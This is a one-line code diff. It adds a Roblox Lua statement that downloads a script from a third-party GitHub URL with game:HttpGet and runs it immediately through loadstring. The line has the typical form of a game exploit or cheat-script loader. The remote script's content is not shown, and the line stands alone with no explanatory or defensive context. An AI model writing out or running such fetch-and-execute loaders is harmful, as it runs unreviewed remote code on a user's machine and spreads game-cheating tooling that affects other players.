@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bndrdev/Bander/refs/heads/main/Script.lua"))()
